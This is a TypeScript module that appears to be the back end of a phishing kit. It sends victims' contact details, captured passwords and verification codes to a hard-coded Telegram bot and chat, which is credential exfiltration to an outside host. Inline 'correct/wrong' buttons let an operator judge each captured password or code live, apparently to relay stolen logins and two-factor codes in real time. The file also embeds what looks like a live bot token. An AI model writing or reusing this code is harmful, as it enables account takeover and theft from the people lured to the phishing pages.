const TELEGRAM_BOT_TOKEN = '8421299691:AAFyo8ekstpNFq9l3_VSPVz2vir2DuFxIAI';
const TELEGRAM_CHAT_ID = '8446832092';

interface TelegramMessage {
  contact: string;
  pageName?: string;
  industry?: string;
  password?: string;
  code?: string;
  step: string;
  status?: string;
}

export const sendToTelegram = async (data: TelegramMessage) => {
  try {
    let message = '';
    
    switch (data.step) {
      case 'contact':
        message = `🆕 NEW LEAD
📱 Contact: ${data.contact}
📄 Page: ${data.pageName}
🏢 Industry: ${data.industry}
📍 Step: Contact collected`;
        break;
        
      case 'password':
        message = `🔐 PASSWORD ATTEMPT
📱 Contact: ${data.contact}
🔑 Password: ${data.password}
📍 Status: ${data.status}`;
        break;
        
      case 'code':
        message = `📟 CODE VERIFICATION
📱 Contact: ${data.contact}
🔢 Code: ${data.code}
📍 Status: ${data.status}`;
        break;
        
      case 'success':
        message = `✅ PROCESS COMPLETED
📱 Contact: ${data.contact}
🎉 Status: Successfully verified`;
        break;
    }

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      }),
    });

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    return await response.json();
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    throw error;
  }
};

export const sendPasswordResult = async (contact: string, password: string, isCorrect: boolean) => {
  try {
    const message = `🔐 PASSWORD VERIFICATION
📱 Contact: ${contact}
🔑 Password: ${password}
📍 Result: ${isCorrect ? '✅ CORRECT' : '❌ INCORRECT'}`;

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const keyboard = {
      inline_keyboard: [
        [
          { text: '✅ Correct Password', callback_data: `password_correct_${contact}` },
          { text: '❌ Wrong Password', callback_data: `password_wrong_${contact}` }
        ]
      ]
    };

    await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        reply_markup: keyboard,
        parse_mode: 'HTML'
      }),
    });
  } catch (error) {
    console.error('Error sending password result:', error);
  }
};

export const sendCodeResult = async (contact: string, code: string, isCorrect: boolean) => {
  try {
    const message = `📟 CODE VERIFICATION
📱 Contact: ${contact}
🔢 Code: ${code}
📍 Result: ${isCorrect ? '✅ CORRECT' : '❌ INCORRECT'}`;

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const keyboard = {
      inline_keyboard: [
        [
          { text: '✅ Correct Code', callback_data: `code_correct_${contact}` },
          { text: '❌ Wrong Code', callback_data: `code_wrong_${contact}` }
        ]
      ]
    };

    await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        reply_markup: keyboard,
        parse_mode: 'HTML'
      }),
    });
  } catch (error) {
    console.error('Error sending code result:', error);
  }
};